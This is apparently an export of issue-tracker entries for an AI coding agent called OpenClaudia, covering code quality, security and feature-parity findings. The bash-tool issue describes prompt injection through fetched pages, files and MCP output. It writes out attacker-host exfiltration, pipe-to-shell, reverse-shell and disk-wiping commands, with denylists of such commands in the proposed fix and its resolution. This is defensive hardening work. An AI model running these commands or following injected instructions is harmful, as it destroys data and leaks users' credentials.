Additionally, ask_user_question / enter_plan_mode / exit_plan_mode / task_* / lsp / cron_* / worktree_* tools have ZERO aliases here — a model using Claude-Code shorthand like <ask_user> cannot invoke them via the interceptor.

2. Similarly each handler declares parameter aliases per its schemars struct (#[serde(alias = "file_path")] on the path field). Deserialize via the handler's own schema rather than a hand-maintained map.

b5e24780-0a14-4284-b886-18a2656e5def.title: Bash tool: no command allowlist/denylist — model can rm -rf /, curl | sh, exfiltrate secrets
b5e24780-0a14-4284-b886-18a2656e5def.description:
Steps to reproduce:
1. 

Expected: 
Actual: 

**Dimension:** Security and Access (Input Handling, Least Privilege)

**Location:** /home/doll/OpenClaudia/src/tools/bash/mod.rs lines 309-389 (execute_bash), 48-164 (spawn background)

**Violation:**
execute_bash forwards the model-supplied 'command' argument straight to bash -c with ZERO allowlist, denylist, dangerous-verb filtering, or env scrubbing. A malicious prompt-injection from any tool output (web_fetch of a poisoned page, read_file of a poisoned source, MCP tool payload) can achieve arbitrary RCE with the OpenClaudia user's full privileges. Concrete attack vectors observable from the present code: (a) 'rm -rf --no-preserve-root /'; (b) 'curl http://attacker/x.sh | bash'; (c) 'cat ~/.ssh/id_rsa | curl -d @- http://attacker/'; (d) 'find / -name "*.env" -exec cat {} + | nc attacker 4444'; (e) environment variables like ANTHROPIC_API_KEY are inherited unscrubbed into the child bash. There is a 'guardrails' blast-radius check on file paths (write.rs:43, edit.rs:56) but NO equivalent for bash commands. Permission checks exist via check_tool_permission (mod.rs:974) but nothing in the bash path validates the command string itself.

**Mandated Refactor:**
1. Introduce a CommandPolicy in src/permissions.rs with three layers:
   - Hard denylist of irrecoverable or exfiltration verbs: rm -rf /, dd of=/dev/, mkfs, > /dev/sd*, chmod -R 777, curl|bash, wget|sh, nc -e, bash -i > /dev/tcp/, ssh-keygen -R *, etc.
   - Resource/path confinement: reject commands that reference paths outside the project root unless explicitly allowlisted (reuse the logic in guardrails::check_file_access).
   - Env scrubbing: .env_clear() then re-populate ONLY PATH, HOME, USER, LANG; strip ANTHROPIC_API_KEY, OPENAI_API_KEY, AWS_*, TAVILY_API_KEY, BRAVE_API_KEY.
2. Parse the command with shell-words or shlex before dispatch; reject if any token resolves to an absolute path under /etc, /root, /sys, /proc (selfreferential refs), or writes to /dev.
3. Short-circuit the bash tool entirely when permission_mgr.check('bash', &args) returns NeedsPrompt — current code only prompts via caller (proxy.rs) but TUI flows can silently auto-allow. Enforce a default 'deny-and-prompt' posture.
4. Add cap on command length (e.g. 4 KiB) — presently unbounded.
5. Add rlimit via unshare/prlimit for CPU/memory on Unix, job objects on Windows, so a fork-bomb or 'yes | head -c 100G' cannot DoS the host.

e22ac076-0822-4230-89ab-0d157841764c.author: lOrm
e22ac076-0822-4230-89ab-0d157841764c.content:
Resolved in commit (pending). Changes:

**New module:** `src/tools/bash/policy.rs` — contains:
- `is_sensitive_env(key)`: denylist check covering ANTHROPIC_API_KEY, OPENAI_API_KEY, AWS_*, AZURE_*, GCP_*, CLAUDE_CODE_*, GITHUB_TOKEN, KUBECONFIG, VAULT_TOKEN, DOCKER_*, and every `*_API_KEY`, `*_TOKEN`, `*_SECRET`, `*_PASSWORD`, `*_PASSPHRASE`, `*_PRIVATE_KEY` suffix.
- `denied_reason(cmd)`: fixed-substring denylist for `rm -rf /`, `mkfs`, `dd of=/dev/sd`, fork bomb, `> /dev/sd`, `chmod 777 /`, `bash -i >& /dev/tcp`, `nc -e /bin/`, etc., PLUS a regex catching structural `curl/wget/fetch ... | (sudo) (ba)sh` pipe-to-shell attacks regardless of URL in between.
- `validate_command(cmd)`: length cap of 4 KiB + denylist check, returns actionable error message.
- `apply_env_scrub(&mut Command)`: removes every env var matching `is_sensitive_env` before spawn (preserves PATH/HOME/CARGO_HOME/etc. so legitimate commands still work).

**Wired into:** `src/tools/bash/mod.rs`
- `execute_bash()` synchronous path: calls `validate_command()` before dispatch; `apply_env_scrub()` on the Command builder on both Windows (Git Bash or bash) and Unix paths.
- `BackgroundShellManager::spawn()`: same `validate_command()` + `apply_env_scrub()` before process spawn.

**Tests:** 3 unit tests in `policy::tests` covering sensitive-env detection (provider keys, AWS_, suffix families, whitelist of PATH/HOME/CARGO_HOME), denylist pattern matches (rm -rf /, fork bomb, mkfs, case-insensitive curl|BASH, pipe-to-shell with URL in between), and length-cap enforcement. All pass (`cargo test --lib bash::policy`), full lib suite clean at 574/574.

**Explicitly out of scope for this change (follow-up items):**
- rlimit/unshare sandbox for CPU/memory/fork-bomb resistance — platform-specific, needs its own design.
- Token-level command parsing via shlex/shell-words to reject absolute paths into /etc, /root, /sys, /proc.
- Integration with `check_tool_permission` to force deny-and-prompt (this remains caller-driven).

The defense is layered: the denylist is a blunt instrument that catches unsophisticated attacks; the env scrubbing is the more important defense against credential exfiltration (stops `env | nc attacker` from leaking provider keys even when the attacker's command is otherwise benign-looking).

b73c9532-eadb-4bb8-9990-228ad8f32c02.title: execute_exit_worktree status check uses string equality on git output instead of git plumbing
b73c9532-eadb-4bb8-9990-228ad8f32c02.description:
## Severity
Minor

## Dimension
KISS / Decoupling

## Location
src/tools/worktree.rs:186-192 (git-dir vs git-common-dir comparison)

## Violation
```rust
if git_dir == common_dir || git_dir == ".git" {
    return ("Not in an isolated worktree. ...", true);
}
```

The check determines "am I in the main worktree or a child worktree" by comparing the string outputs of two separate git rev-parse invocations. The two values can drift in any of: trailing whitespace, relative-vs-absolute paths, case (Windows), the special `.git` literal value. Hardcoding `git_dir == ".git"` as a second equality check shows the author hit this edge but only patched the specific instance they encountered.

Cleaner: `git rev-parse --git-common-dir` and `git rev-parse --is-inside-worktree` return canonical values, but git has a dedicated `git worktree list --porcelain` that lists every worktree and marks the main one explicitly. Use that.

Worse, the git_dir extraction (line 181-184) silently defaults to empty string on error: `.unwrap_or_default()`. If git rev-parse fails entirely (corrupted .git), git_dir == "" and common_dir != "" so the function FALSELY claims we are in an isolated worktree and proceeds to remove it.

## Mandated refactor
Use `git worktree list --porcelain`, parse the entries, find the one matching the current cwd, check its position in the list (main is first). This is a single git invocation and gives canonical answers. Drop the dual rev-parse comparison entirely.

## Filed from QA review dispatch

b7816185-ad35-4b25-b51f-297cc920f94c.title: Add agent-scoped background shell cleanup on agent exit (parity with CC killShellTasksForAgent)
b7816185-ad35-4b25-b51f-297cc920f94c.description:
## Gap

CC's killShellTasksForAgent (tasks/LocalShellTask/killShellTasks.ts:53-72) kills all running background bash tasks owned by a specific agent when that agent exits. This prevents background processes from outliving their parent agent (zombie prevention).

OC has no agent ownership model for background shells. BackgroundShellManager (src/tools/bash/mod.rs:38-268) tracks shells by shell_id only — there is no agent_id field. When a session or agent finishes, its background shells continue running until the OC process exits or a kill_shell call is made.

## Parity reference
- CC: tasks/LocalShellTask/killShellTasks.ts:53-72 killShellTasksForAgent
- OC: missing — BackgroundShellManager has no agent_id field, no per-agent kill

## Acceptance
- BackgroundShell struct gets optional agent_id field
- On agent exit, all shells owned by that agent_id are terminated via terminate_process_tree
- Surfaces as cleanup hook in the session/agent lifecycle

b824e3a5-63b2-46a3-a910-c779344cc2f7.title: QA: PermissionManager logs decisions at debug level; audit trail invisible in production
b824e3a5-63b2-46a3-a910-c779344cc2f7.description:
## Severity
Minor
## Dimension
security
## Location
src/permissions.rs:172-226, 254-262
## Violation
All permission decisions log at `debug!` level:
```rust
debug!(
    tool = %canonical_tool, target = %target, pattern = %rule.pattern,
    "Allowed by persisted always-allow rule"
);
...
debug!("Allowed by session rule");
...
debug!("Allowed by default_allow config pattern");
```
Production deployments typically run at `info` or `warn`. The result:
**every successful permission grant is invisible**. There is no
default-visible audit trail of which tool calls were allowed, by which
rule, against which target. OWASP A09 — security logging failure for
authorization decisions. Only `warn!` (malformed args, sandbox bypass
attempt) reaches default-level logs.
## Mandated refactor
Promote `Allowed by ...` decisions to `info!` (or `audit!` if a
dedicated channel exists) so production logs always capture
authorization outcomes. Emit one structured field per decision: tool,
target, decision (allow/deny/prompt), rule_tier (persisted/session/
default_allow/safety), and pattern. Consider routing security-relevant
logs to a separate sink (file or syslog) so they survive log rotation
or app-level log-level changes.

b8313ee2-4041-40b7-8583-ddf88ecaea01.title: Swallowed async errors and unbounded body reads in proxy handlers
b8313ee2-4041-40b7-8583-ddf88ecaea01.description:
Steps to reproduce:
1. 

Expected: 
Actual: 

Dimension: Error Orchestration / Defensive Programming

Location:
  - src/proxy.rs line 731: `let usage_pct_f64 = f64::from(utilization_pct_x10 as u32) / 10.0;` with `#[allow(clippy::cast_possible_truncation)]`
  - src/proxy.rs line 750: `(f64::from(context_window as u32) * f64::from(warn_threshold)) as usize;` with `#[allow(clippy::cast_possible_truncation, clippy::cast_sign_loss)]`
  - src/proxy.rs line 826-828: `axum::body::to_bytes(body, usize::MAX).await.unwrap_or_default();` — if the body is malformed or stream fails, we silently get an empty bytes buffer and then try to JSON-parse it.
  - src/proxy.rs line 864-865: `serde_json::to_vec(&blocking.final_response).unwrap_or_else(|_| response_bytes.to_vec())` — silent fallback to original bytes if VDD-revised JSON cannot be serialized.
  - src/oauth.rs line 495: `.unwrap_or_else(|_| reqwest::Client::new())` — if the custom client builder fails we silently drop the User-Agent and timeout that the comment says is CRITICAL.

Violation: Multiple .unwrap_or_default() / .unwrap_or_else(_) calls in async handlers silently mask errors that have real operational consequences:
  1. to_bytes with usize::MAX has no hard upper bound — a hostile/buggy provider can force unbounded memory allocation (memory-DOS). Even if the allocation succeeds, .unwrap_or_default() on failure returns an empty Bytes silently, feeding downstream JSON parsing that will then fail opaquely.
  2. OAuthClient::new() silently falls back to a Client WITHOUT the 'Claude Code/1.0' user-agent, which the code comment explicitly says is required for OAuth. Users hit runtime OAuth failures with no diagnostic trail.
  3. The cast_possible_truncation suppressions violate project policy ('No allow(dead_code)' memory note explicitly bans suppressing warnings instead of fixing the root cause).

Mandated Refactor:
  1. Replace usize::MAX with a config-driven max_body_bytes (default 50 MiB for JSON responses). Return a ProxyError::InvalidBody on size overrun with a concrete error message.
  2. Change .unwrap_or_default() in body reads to a proper match { Ok(b) => b, Err(e) => return Err(ProxyError::RequestError(...)) }.
  3. In OAuthClient::new(), change the signature to fn new() -> Result<Self> and propagate the builder error — callers already operate in a Result context (exchange_code, refresh_token all return Result).
  4. Remove the two #[allow(clippy::cast_possible_truncation, clippy::cast_sign_loss)] blocks. Replace the percentage computation with u64 arithmetic entirely: `let utilization_ppm = saturating_mul(1_000_000) / context_window;` and format via ppm/10_000.

b9152c9c-477c-4ec2-8a44-c6300c9f1cbd.description:
## Severity
Major
## Dimension
complexity
## Location
src/proxy.rs:1513-1553, 1285-1313
## Violation
Both convert_response and convert_response_with_usage buffer the entire upstream response via response.bytes().await before constructing the axum Response::Body. For non-streaming responses this is fine. For SSE the proxy never streams — every response is fully buffered. A long-running streaming generation (e.g. claude-opus-4 with 8k tokens, 5 min wall-clock) means the client sits idle for the full generation. Worse, body_max_size is implicit (no cap) so a malicious or buggy upstream that emits megabytes of SSE OOMs the proxy.
## Mandated refactor
For streaming responses (content-type: text/event-stream), use Body::from_stream(response.bytes_stream()) so axum forwards bytes as they arrive. Apply max_response_bytes from config to bound the streaming path too (use a wrapping stream that errors past the limit). Only buffer for non-streaming JSON responses where extract_usage requires the full body.
## Filed from QA review dispatch

ba9ccb18-bbec-47ab-8c87-8a06f64e8525.title: tool_intercept: extract_all_tool_calls performs O(N^2) buffer clones in driving loop
ba9ccb18-bbec-47ab-8c87-8a06f64e8525.description:
## Severity
Minor
## Dimension
complexity
## Location
src/tool_intercept.rs:243-272 and src/tool_intercept.rs:295-302
## Violation
```rust
while self.has_complete_block() {
    let (tools, before, _after) = self.extract_tool_calls();
    ...
}
```

`try_extract_invoke_format` performs each iteration:

```rust
let before = self.buffer[..start_idx].to_string();
let after = self.buffer[result_end..].to_string();
self.buffer.clone_from(&after);
```

For a buffer of N bytes containing K tool calls, total allocation is O(N*K) — quadratic. `has_complete_block` re-scans end-to-end on every loop iteration on top of that.

## Mandated refactor
Single-pass parser: walk the buffer once with a cursor and slice views. At minimum, replace `self.buffer.clone_from(&after)` with `self.buffer.drain(..result_end);` which is O(N) total instead of O(N*K).

bb997dcf-7f32-4943-b2d3-9d886676204c.description:
## Summary

CC's bypassPermissions mode (utils/permissions/permissions.ts:1266-1281) still enforces:
- Step 1g: safetyCheck decisions (writes to .git/, .claude/, .vscode/, shell configs must prompt)
- Step 1e: requiresUserInteraction tools (ExitPlanMode, AskUserQuestion) still ask
- Step 1f: content-specific ask rules still fire
- Step 1d: deny rules still fire

OC's PermissionManager::unrestricted() (src/permissions.rs:105-123) sets enabled=false, which short-circuits check() at line 132-134 before ANY of these checks run. A call site using unrestricted() allows:
- Edit to .git/config
- Write to .claude/settings.json
- Write to ~/.zshrc
without any check.

## Security relevance (high)
CC explicitly designed bypassPermissions to still block safety-critical paths. OC's unrestricted() is a superset bypass that removes all protection. Any OC call site that uses unrestricted() instead of bypassPermissions-mode is unintentionally more permissive than CC.

## Behaviors to align
- Add a safety-path check that fires even when enabled=false or in unrestricted()
- OR document that unrestricted() callers must not be used in contexts where safety paths matter
- Add test: unrestricted().check('edit_file', {path: '.git/config'}) currently returns Allowed (document this gap)
- Add test: CC bypassPermissions + .git/config write → still prompts (safetyCheck step 1g)

#531

- CC: utils/permissions/permissions.ts:1230-1236 (step 1e, requiresUserInteraction)

bebac181-5222-452e-b579-c448646625b0.title: File read tracker: LRU contains global state, canonicalize() may return different paths for relative vs absolute inputs
bebac181-5222-452e-b579-c448646625b0.description:
Current state: 

Desired state: 

Reason: 

**Dimension:** Cognitive Readability / State Management

**Location:** /home/doll/OpenClaudia/src/tools/file/mod.rs lines 26-71 (ReadFileTracker), 43-55 (mark_read), 58-64 (has_been_read)

**Violation:**
The READ_TRACKER is a global LazyLock<ReadFileTracker> that holds a Mutex<Vec<PathBuf>>. Several defects:
1. **Canonicalization fallback hides bugs.** Both mark_read (line 44) and has_been_read (line 59) use: std::fs::canonicalize(path).unwrap_or_else(|_| path.to_path_buf()). If canonicalize fails (permissions, non-existent, symlink-loop), the raw path is used. This means read_file('./foo.txt') can canonicalize to /abs/foo.txt, but edit_file('foo.txt') from a different CWD (see worktree CWD mutation) may fail canonicalize and compare the raw string 'foo.txt' against '/abs/foo.txt' — and the gate trips even after a successful read.
2. **Linear scan through 10,000-element Vec per has_been_read.** An agent that operates on many files pays O(n) on every edit. Should be HashSet<PathBuf>.
3. **No TTL.** A file read 2000 edits ago still satisfies has_been_read. If the file changed on disk since, the model edits based on stale content — exactly what the read-before-edit gate was supposed to prevent.
4. **Global singleton prevents test isolation.** reset_read_tracker at mod.rs:62 is a #[doc(hidden)] escape hatch proving the design is wrong — tests have to reach into global state. Makes parallel tests flaky.

**Mandated Refactor:**
1. Move READ_TRACKER onto SessionState, passed through ToolContext. Eliminate the LazyLock global entirely.
2. Replace Vec<PathBuf> with LinkedHashMap / IndexMap<PathBuf, FileFingerprint> where FileFingerprint = { mtime, size, read_at }. On has_been_read, re-stat the file; if (mtime, size) differs, consider it not read.
3. Fail canonicalize with a hard error instead of falling back to raw path — inconsistent identity under fallback is the root cause of the path-comparison bug.
4. Cap at 1024 files per session; LRU-evict oldest.

bec00a66-9604-4ca9-8efa-e5938aa1a031.title: HashMap<String,Value> argument extraction pattern duplicated across every tool
bec00a66-9604-4ca9-8efa-e5938aa1a031.description:
## Severity
Major

## Dimension
DRY / KISS / SOLID-S

## Location
src/tools/file/write.rs:9-40, src/tools/file/edit.rs:9-66, src/tools/file/notebook.rs:49-78, src/tools/file/mod.rs:188-198, src/tools/cron.rs:142-161, src/tools/todo.rs:76-127, src/tools/worktree.rs:59-68

## Violation
Every executor reimplements identical "extract a required string arg or return an error string" logic, e.g. cron.rs:142-161:

```rust
let name = match args.get("name").and_then(|v| v.as_str()) {
    Some(n) => n.to_string(),
    None => return ("Error: name is required".to_string(), true),
};
let cron_expression = match args.get("schedule").and_then(|v| v.as_str()) { ... };
let prompt = match args.get("prompt").and_then(|v| v.as_str()) { ... };
```

Same pattern in todo.rs:88-121, notebook.rs:50-75, etc. The error message style even drifts between files ("Error: name is required" vs "Missing 'path' argument" vs "missing 'content' field"). This is the textbook DRY violation: N copies of the same dispatch protocol, each free to regress independently.

## Mandated refactor
Introduce a typed `ToolArgs` extractor (use `serde` deserialization into a per-tool input struct; e.g. `#[derive(Deserialize)] struct CronCreateArgs { name: String, schedule: String, prompt: String, ... }`). Replace the manual extraction blocks with `let args: CronCreateArgs = serde_json::from_value(raw_args.into())?;`. This gives uniform error messages, free defaults via `#[serde(default)]`, schema-level rejection of unknown fields, and eliminates the duplicate validation code entirely.

## Filed from QA review dispatch

- Speculative tool calls (read_file, list_files, bash with read-only commands) write results into the overlay
- Prediction heuristic: pattern-match SpeculationHint::recent_messages to predict the next tool call (e.g., after a write_file, predict read_file on the same path)
- Requires an overlay-filesystem subsystem (in-memory path-to-content map, copy-on-write semantics)
- Wire build_engine in SpeculationConfig::enabled = true path to return OverlaySpeculationEngine

Phase 3 — Acceptance workflow
- When the model's actual tool call matches the prediction (Hit): promote the overlay result without re-running the tool
- When it does not match (Miss/PartialMiss): discard the overlay silently, run the tool normally
- Pipeline integration: pipeline::run_turn should call after_turn with actual tool names so the engine records hit/miss metrics
- Expose hit-rate metric in TUI status bar

Integration point: src/speculation/mod.rs — all public types and the SpeculationEngine trait are already defined. The factory build_engine has a cfg.enabled branch that logs a warning and falls back to no-op; replace that branch with the real OverlaySpeculationEngine.

Constraint: No unimplemented!() or stubs. Every line shipped must do real work.

bf744e43-2429-4d0c-9976-42fead9cd618.title: modes::Modifier::Debug and Preset::Debug share name with serde rename_all collision risk
bf744e43-2429-4d0c-9976-42fead9cd618.description:
## Severity
Trivial
## Dimension
naming
## Location
src/modes/mod.rs:67-104 (Modifier and Preset enums)
## Violation
Both `Modifier` and `Preset` have a variant named `Debug`:

```rust
pub enum Modifier { Bold, Debug, Methodical, Director, Readonly, ContextPacing }
pub enum Preset   { Create, Extend, Safe, Refactor, Explore, Debug, Methodical, Director }
```

Three variant names overlap (`Debug`, `Methodical`, `Director`) across the two enums. When both are serialized in the same JSON document via serde (e.g., a session-state dump or config slice), readers cannot disambiguate without the enclosing field name. The `Display` impl produces the same string ("debug") for both, so log lines like `"mode: debug"` are ambiguous.

This is a naming-discipline violation per §3.3: enum variants should be uniquely identifiable in their domain. The Preset::Debug variant is also confusingly close to the standard library `std::fmt::Debug` trait — the literal name "Debug" inside `match preset { Preset::Debug => ... }` reads as a trait reference rather than a variant.
## Mandated refactor
Rename `Preset::Debug` → `Preset::Investigate` (matches the existing "Investigation-first debugging" doc-comment). Rename `Preset::Methodical` and `Modifier::Methodical` to disambiguate by prefix (`Preset::MethodicalRollout` vs `Modifier::Methodical`) OR document the intentional overlap and add a `#[serde(rename = "preset-debug")]` discriminator on Preset variants so JSON consumers can't confuse them.
## Filed from QA review dispatch

c0f67de3-a89a-41a4-99d8-9cffbfebe430.title: search_duckduckgo uses fixed 500ms sleep as page-load synchronization
c0f67de3-a89a-41a4-99d8-9cffbfebe430.description:
## Severity
Minor
## Dimension
concurrency
## Location
src/web.rs:475-583 (search_duckduckgo), line 501
## Violation
After `wait_until_navigated()`, the function calls `std::thread::sleep(Duration::from_millis(500))` to "wait for page to load" before reading content. This is a race condition: on slow machines or under heavy load the page may not be ready; on fast loads the 500ms is wasted latency. Inside a tokio runtime this is also a hard block on the executor thread because the function is `pub fn`, not async, and is invoked via `block_in_place(handle.block_on(...))` from `execute_web_search`.

```rust
// Wait for page to load
std::thread::sleep(Duration::from_millis(500));
```

A similar 2-second blocking sleep exists in `fetch_with_browser` at line 622.
## Mandated refactor
Use a polling wait with timeout: `tab.wait_for_element_with_custom_timeout(".result", Duration::from_secs(5))` (chromiumoxide / headless_chrome both expose this). For the `fetch_with_browser` path, wait for `document.readyState === 'complete'` via `tab.evaluate(...)` polled with a timeout. If a true wall-clock delay is needed, use `tokio::time::sleep` from an async context.
## Filed from QA review dispatch

c15e8367-cf9a-4902-984b-c3e09832e0e8.title: SSE buffer can grow unbounded when upstream never emits newlines
c15e8367-cf9a-4902-984b-c3e09832e0e8.description:
## Severity
Critical
## Dimension
security
## Location
src/pipeline.rs:516-543
## Violation
The SSE parsing loop in `stream_sse_response` accumulates upstream bytes into an unbounded `String` until a `\n` is found. A hostile or broken upstream that streams large payloads without `\n` (or a single very long SSE event) will inflate `buffer` until the process OOMs. The only timeout (`last_data_time.elapsed()`) is reset by every byte received, so a 1 MiB/s newline-free stream is welcomed.

```rust
let mut buffer = String::new();
...
buffer.push_str(&String::from_utf8_lossy(&chunk));
while let Some(line_end) = buffer.find('\n') {
```
## Mandated refactor
Introduce `MAX_SSE_LINE_BYTES` and `MAX_SSE_BUFFER_BYTES` constants; abort the stream and emit `AppEvent::ApiError` when either is exceeded. Switch to `BytesMut` and `memchr` over raw bytes to avoid the per-chunk UTF-8 round-trip. Track total bytes against an absolute ceiling separate from the inactivity timeout.
## Filed from QA review dispatch

c1a14e22-485e-4420-988d-3edfd5a52da1.title: edit_file does not validate old_string equals new_string before doing pointless write
c1a14e22-485e-4420-988d-3edfd5a52da1.description:
## Severity
Trivial

## Dimension
Functional Correctness / KISS

## Location
src/tools/file/edit.rs:84-95 (occurrence check then replacen)

## Violation
If `old_string == new_string`, the code happily reads the file, finds the string, performs `content.replacen(old, new, 1)` (a no-op), and writes the file back unchanged. if old_string == new_string {
```rust
    return ("old_string and new_string are identical — edit would be a no-op. Either change one or remove the call.".to_string(), true);
}
```

c264aa65-2be0-455c-a556-e54d08701ffb.title: subagent: BackgroundAgentManager silently swallows Mutex poisoning, masking corruption
c264aa65-2be0-455c-a556-e54d08701ffb.description:
## Severity
Minor
## Dimension
error-handling
## Location
src/subagent.rs:294-296 (register), src/subagent.rs:302-304 (get), src/subagent.rs:307-313 (finish), src/subagent.rs:317-323 (fail), src/subagent.rs:333-349 (list)
## Violation
Every BackgroundAgentManager method uses `self.agents.lock().ok()` / `if let Ok(mut a) = self.agents.lock()`, silently treating a `PoisonError` as a successful no-op:

```rust
pub fn register(&self, agent_type: AgentType, task: &str) -> String {
    ...
    if let Ok(mut agents) = self.agents.lock() {
        agents.insert(id.clone(), agent);
    }
    id  // returned even if insert never happened
}
```

If any code path panics while holding the lock (e.g., during `register`/`finish`), every subsequent call appears to succeed but operates on no data. `register` returns an id that was never inserted. `agent_output` then reports the agent "not found" forever — with no error trail showing the poisoning event.

Same pattern in `result.lock().ok()` for the BackgroundAgent inner mutexes (lines 308-310, 318-321, 423-424).

## Mandated refactor
Either (a) propagate `PoisonError` as a typed `RegistryError::Poisoned` so callers can recover or abort, or (b) call `.lock().unwrap_or_else(PoisonError::into_inner)` to recover the inner data and log a `tracing::error!` event. Silent no-op is the worst of all options.
## Filed from QA review dispatch

c28de729-87cb-4388-af6e-6cc38158dcc8.title: deep_merge unbounded recursion and array concatenation explosion
c28de729-87cb-4388-af6e-6cc38158dcc8.description:
Steps to reproduce:
1. 

Expected: 
Actual: 

**Dimension**: Performance & Complexity / Security (DoS)

**Location**: src/hooks/merge.rs:75-90 (deep_merge)

**Violation**: deep_merge is a naive recursive function with:
- No recursion-depth limit — a maliciously deeply nested JSON settings file (e.g. 100k levels) overflows the stack.
- Arrays concatenate without upper bound (merge.rs:83-85) — a hostile managed-settings file can append infinitely to, e.g., hooks.PreToolUse causing OOM.
- load_claude_settings (hooks/claude_compat.rs:108-185) applies FOUR merge_settings_file calls in sequence without validating total accumulated size.
- When the project-level settings.local.json is gitignored/not-checked-in, an attacker who gains write on the developer machine has unbounded influence.

**Mandated Refactor**:
1. Convert deep_merge to iterative using an explicit work stack; enforce MAX_DEPTH=32.
2. Enforce MAX_SETTINGS_BYTES (e.g. 1 MiB) before calling serde_json::from_str in merge_settings_file.
3. Enforce MAX_ARRAY_LEN per array after merge (e.g. 1024).
4. Return Result<(), MergeError> from deep_merge instead of mutating in place; surface errors in merge_settings_file.

c2c37ed1-518f-4967-8222-1fabe61f008e.title: Hooks dedup_hook_entries O(n*m) and silently drops base entries
c2c37ed1-518f-4967-8222-1fabe61f008e.description:
Current state: 

Desired state: 

Reason: 

**Dimension**: Structural Modularity / Functional Correctness

**Location**: src/hooks/merge.rs:41-47 (dedup_hook_entries)

**Violation**: The dedup logic:
```rust
for entry in other {
    base.retain(|existing| existing.matcher != entry.matcher);
    base.push(entry);
}
```
- Complexity: O(|other| * |base|) with Vec::retain on every iteration. For 1000 entries this is 1M compares.
- SILENTLY discards base entries whose matcher collides — including differently-configured hook commands that use the same regex. A user with a project hook and a user-global hook on Matcher='Write' loses the user-global hook without any warning log.
- Comparing Option<String> by equality is brittle: `None` and `Some("")` are treated as different (even though merge_claude_hooks already normalizes empty-to-None, any other source may not).
- 'later source wins' semantics is inverted relative to most config tools (earlier source wins is more common for lockfile-like semantics); but worse, the docs at merge_hooks_config (merge.rs:18-19) claim 'other takes precedence' yet session_start/session_end are presumably independent events that SHOULD union, not replace.

**Mandated Refactor**:
1. Use a HashMap<Option<String>, HookEntry> keyed by normalized matcher for O(n+m) merge.
2. When a replacement occurs, log WARN with the replaced hook's command list so users can debug.
3. Add a 'merge_strategy' field at the config level with variants: `Replace` (current) | `Append` | `Error` (treat collision as misconfiguration).
4. Add tests: merging a project hook with a user-global hook on the same matcher MUST be explicit about which wins, covered by a unit test.

Normalized None/Some("") matchers to a single key. Emit WARN log naming the replaced commands so silent overrides are visible. Three new tests cover collision semantics and key normalization. Mandated-refactor items #1, #2, #4 addressed; item #3 (merge_strategy config field) deferred — current Replace-only semantics match the documented contract.

c2f4e3de-dd3b-4026-9273-b80d5f83927b.title: DisplayMessage uses twin boolean flags (is_error, is_thinking) — replace with enum status
c2f4e3de-dd3b-4026-9273-b80d5f83927b.description:
Current state: 

Desired state: 

Reason: 

Dimension: Structural Modularity (Boolean Flag Parameter) / Cognitive Readability
Location: src/tui/messages.rs:10-16 and every DisplayMessage literal (30+ call sites across src/tui/app.rs)
Violation: DisplayMessage { role: String, content: String, tool_name: Option<String>, is_error: bool, is_thinking: bool } encodes four orthogonal states (normal, error, thinking, tool-result) as two independent booleans. The combination (is_error=true, is_thinking=true) is nonsensical but representable. Every construction site repeats 'is_error: false, is_thinking: false' boilerplate. This is the boolean-flag anti-pattern applied to data carriers.
Mandated Refactor: Replace with: pub enum MessageKind { User, Assistant, AssistantThinking, SystemInfo, SystemError, ToolStart { name: String }, ToolOk { name: String }, ToolErr { name: String } }. Then pub struct DisplayMessage { kind: MessageKind, content: String }. This makes invalid states unrepresentable and eliminates ~120 lines of 'role: "system".to_string(), tool_name: None, is_error: false, is_thinking: false' boilerplate in app.rs. The match arms in messages.rs::build_lines become exhaustive and self-documenting.

c34358eb-1df3-43c4-932a-123eb24b6061.title: Phase 1 spec: tools — MCP (MCPTool, McpAuth, List/ReadMcpResource + services/mcp) [CC parity]
c34358eb-1df3-43c4-932a-123eb24b6061.description:
## Goal

Extract a behavioral spec for this subsystem by reading Claude Code's TypeScript source. **Output**: update this issue body with a markdown spec pinning down each testable contract (input → expected output, edge cases, error paths). No Rust yet — that is Phase 2.

Parent audit: #523.

## Claude Code source — read these

- `services/mcp/client.ts` (~3348 lines)
- `services/mcp/config.ts` (~1578 lines)
- `services/mcp/useManageMCPConnections.ts` (~1141 lines)
- `services/mcp/elicitationHandler.ts` (~313 lines) — server-prompts-user mid-call
- `services/mcp/xaa.ts` (~511 lines) — enterprise IdP OAuth
- `services/mcp/xaaIdpLogin.ts` (~487 lines)
- `services/mcp/channelPermissions.ts` (~240 lines) — per-server permissions
- `tools/McpAuthTool/McpAuthTool.ts` (~215 lines)

## OpenClaudia counterpart

- `src/mcp.rs` (~1084 lines) — `McpServer::new` 360-438, `refresh_tools` 439-476, capability check 418

---

## Behavioral spec

### B1 — Handshake: `McpServer::new` / `connectToServer`

**CC**: `services/mcp/client.ts:595-1641` — `connectToServer` (memoized). Transport selection is exhaustive: `stdio` (default), `sse`, `sse-ide`, `ws`, `ws-ide`, `http` (StreamableHTTP), `sdk` (in-process via `SdkControlClientTransport`), `claudeai-proxy`. For `stdio` the SDK `StdioClientTransport` spawns the subprocess; for `http` a `StreamableHTTPClientTransport` is used. After transport construction, `client.connect(transport)` races a connection timeout (`getConnectionTimeoutMs()`, env-controlled). The connected client declares capabilities `{roots:{}, elicitation:{}}`. A `ListRootsRequest` handler is registered immediately (returns `file://<cwd>`). Handshake result is memoized via `getServerCacheKey` so re-calls return the cached connection; `onclose` clears the cache to allow reconnection.

**OC**: `src/mcp.rs:360-432` — `McpServer::new` calls `self.initialize()` then `self.refresh_tools()`. `initialize()` sends `initialize` with `protocolVersion: "2024-11-05"` and `clientInfo: {name:"openclaudia", version:<pkg>}`, declares only `capabilities.roots.listChanged:true` (no `elicitation` capability). Then sends `notifications/initialized` (fire-and-forget, `.ok()` discards error). No connection-establishment timeout. Memoization absent — each call to `McpManager::connect_stdio` / `connect_http` creates a fresh server.

**Input**: `(name: &str, transport: Box<dyn McpTransport>)` — transport already spawned/connected by caller.

**Output**: `Result<McpServer, McpError>` containing populated `capabilities` and `tools` on success.

**Edge cases**:
- CC: If `stdio` subprocess's `stderr` emits before connect, it is captured and logged after connect.
- CC: Handshake timeout fires after `getConnectionTimeoutMs()` ms, calls `transport.close()` and rejects.
- OC: `notifications/initialized` failure is silently swallowed (`.ok()`). Missing in CC which uses SDK (SDK sends notification internally).
- OC: `protocolVersion` pinned to `"2024-11-05"` (2024 spec); CC delegates version negotiation to the MCP SDK library.

**Error path**:
- CC: `connectToServer` catches and returns `{type:'failed', error:string}` — no exception escapes. Auth failures (401/`UnauthorizedError`) return `{type:'needs-auth'}`.
- OC: `McpServer::new` propagates `McpError` to caller; no failed-vs-connected distinction — caller must handle `Err`.
